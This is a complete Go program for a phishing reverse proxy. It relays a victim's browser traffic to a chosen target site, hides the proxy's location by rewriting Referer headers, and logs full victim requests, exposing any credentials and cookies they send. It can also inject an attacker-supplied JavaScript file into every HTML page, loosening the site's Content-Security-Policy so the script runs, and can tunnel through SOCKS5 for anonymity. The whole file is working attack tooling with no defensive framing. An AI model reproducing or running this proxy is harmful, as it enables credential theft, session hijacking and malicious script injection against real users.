package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	_ "net/http/pprof"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
	"golang.org/x/net/proxy"
)

const (
	// DefaultTimeout is the HTTP client timeout.
	DefaultTimeout = 20 * time.Second
)

var (
	targetURL      = flag.String("target", "", "The website we want to phish.")
	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
	javascriptURL  = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
	insecure       = flag.Bool("insecure", false, "Listen without TLS.")
	certPath       = flag.String("cert", "", "Path to the x509 encoded SSL certificate in PEM format.")
	privateKeyPath = flag.String("private-key", "", "Path to the x509 encoded certificate in PEM format.")
)

// HTTPTransaction represents a complete request - response flow.
type HTTPTransaction struct {
	Request  *http.Request
	Response *http.Response
}

// ResponseTransformer modifies a response in any way we see fit, such as inserting extra JavaScript.
type ResponseTransformer interface {
	Transform(response *http.Response) error
}

// JavaScriptInjectionTransformer holds JavaScript filename for injecting into response.
type JavaScriptInjectionTransformer struct {
	javascriptURL string
}

// EditContentSecurityPolicy checks if JS inject src is trusted - if it isn't it adds the src to the content security policy
func EditContentSecurityPolicy(response *http.Response, javascriptSrcURL string) {
	contentSecurityPolicy := strings.Split(response.Header.Get("Content-Security-Policy"), ";")

	newContentSecurityPolicy := make([]string, 0)

	for _, section := range contentSecurityPolicy {
		if strings.Contains(section, "script-src") {
			newSection := strings.Trim(section, " ") + " " + javascriptSrcURL
			newContentSecurityPolicy = append(newContentSecurityPolicy, newSection)
		} else {
			newContentSecurityPolicy = append(newContentSecurityPolicy, strings.Trim(section, " "))
		}
	}

	response.Header.Set("Content-Security-Policy", strings.Join(newContentSecurityPolicy, "; "))
}

// Transform Injects JavaScript into an HTML response.
func (j JavaScriptInjectionTransformer) Transform(response *http.Response) error {
	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
		return nil
	}

	javascriptSrcURL := strings.Split(strings.Split(j.javascriptURL, "//")[1], "/")[0]

	if !strings.Contains(response.Header.Get("Content-Security-Policy"), javascriptSrcURL) {
		EditContentSecurityPolicy(response, javascriptSrcURL)
	}

	// Prevent NewDocumentFromReader from closing the response body.
	responseText, err := ioutil.ReadAll(response.Body)
	responseBuffer := bytes.NewBuffer(responseText)
	response.Body = ioutil.NopCloser(responseBuffer)
	if err != nil {
		return err
	}

	document, err := goquery.NewDocumentFromResponse(response)
	if err != nil {
		return err
	}

	payload := fmt.Sprintf(`<script type="text/javascript" src="%s"></script>`, j.javascriptURL)
	selection := document.
		Find("head").
		AppendHtml(payload).
		Parent()

	html, err := selection.Html()
	if err != nil {
		return err
	}
	response.Body = ioutil.NopCloser(bytes.NewBufferString(html))
	return nil
}

// PhishingProxy proxies requests between the victim and the target, queuing requests for further processing.
type PhishingProxy struct {
	client               *http.Client
	targetURL            *url.URL
	responseTransformers []ResponseTransformer
}

func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error) {
	target := request.URL
	target.Scheme = p.targetURL.Scheme
	target.Host = p.targetURL.Host

	req, err := http.NewRequest(request.Method, target.String(), request.Body)
	if err != nil {
		return nil, err
	}
	for key := range request.Header {
		req.Header.Set(key, request.Header.Get(key))
	}

	// Don't let a stray referer header give away the location of our site.
	// Note that this will not prevent leakage from full URLs.
	if request.Referer() != "" {
		req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
	}

	// Go supports gzip compression, but not Brotli.
	// Since the underlying transport handles compression, remove this header to avoid problems.
	req.Header.Del("Accept-Encoding")
	return req, nil
}

// HandleConnection does the actual work of proxying the HTTP request between the victim and the target.
// Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTTPTransaction) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	request, err := http.ReadRequest(reader)
	if err != nil {
		log.Println("Error parsing request:", err.Error())
		return
	}

	req, err := p.copyRequest(request)
	if err != nil {
		log.Println("Error cloning request.")
		return
	}
	resp, err := p.client.Do(req)
	if err != nil {
		log.Println("Proxy error:", err.Error())
		return
	}

	for _, transformer := range p.responseTransformers {
		err := transformer.Transform(resp)
		if err != nil {
			log.Println("Error transforming:", err.Error())
		}
	}

	modifiedResponse, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Println("Error converting requests to bytes:", err.Error())
		return
	}

	_, err = conn.Write(modifiedResponse)
	if err != nil {
		log.Println("Error responding to victim:", err.Error())
		return
	}
	transactions <- &HTTPTransaction{
		Request:  req,
		Response: resp,
	}
}

func processTransactions(transactions <-chan *HTTPTransaction) {
	for transaction := range transactions {
		req, err := httputil.DumpRequest(transaction.Request, true)
		if err != nil {
			log.Println("Error dumping request to console.")
			return
		}
		log.Println(string(req))

		resp, err := httputil.DumpResponse(transaction.Response, false)
		if err != nil {
			log.Println("Error dumping response to console.")
			return
		}
		log.Println(string(resp))
	}
}

func newTLSListener(address, certPath, privateKeyPath string) (net.Listener, error) {
	cer, err := tls.LoadX509KeyPair(certPath, privateKeyPath)
	if err != nil {
		return nil, err
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	return tls.Listen("tcp", address, config)
}

func newInsecureListener(address string) (net.Listener, error) {
	return net.Listen("tcp", address)
}

func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func setupRequiredFlags() {
	flag.Parse()
	if *address == "" {
		exitWithError("--address is required.")
	}

	if *targetURL == "" {
		exitWithError("--target is required.")
	}

	if !*insecure {
		if *privateKeyPath == "" || *certPath == "" {
			exitWithError("--private-key and --cert arguments must point to x509 encoded PEM private key and certificate, or call with the --insecure flag.")
		}
	}
}

func main() {
	setupRequiredFlags()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		exitWithError(err.Error())
	}

	client := &http.Client{
		Timeout: DefaultTimeout,
	}

	if *proxyAddress != "" {
		dialer, err := proxy.SOCKS5("tcp", *proxyAddress, nil, proxy.Direct)
		if err != nil {
			exitWithError(err.Error())
		}
		httpTransport := &http.Transport{}
		httpTransport.Dial = dialer.Dial
		client.Transport = httpTransport
	}

	responseTransformers := []ResponseTransformer{}
	if *javascriptURL != "" {
		responseTransformers = append(responseTransformers, JavaScriptInjectionTransformer{javascriptURL: *javascriptURL})
	}

	phishingProxy := &PhishingProxy{
		client:               client,
		targetURL:            u,
		responseTransformers: responseTransformers,
	}

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	var server net.Listener
	if *insecure {
		server, err = newInsecureListener(*address)
	} else {
		server, err = newTLSListener(*address, *certPath, *privateKeyPath)
	}
	if err != nil {
		exitWithError(err.Error())
	}
	var listenAddr string
	if *insecure {
		listenAddr = fmt.Sprintf("http://%s", *address)
	} else {
		listenAddr = fmt.Sprintf("https://%s", *address)
	}
	log.Println("Listening on:", listenAddr)
	transactions := make(chan *HTTPTransaction)
	go processTransactions(transactions)
	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Error when accepting request,", err.Error())
			continue
		}
		go phishingProxy.HandleConnection(conn, transactions)
	}
}
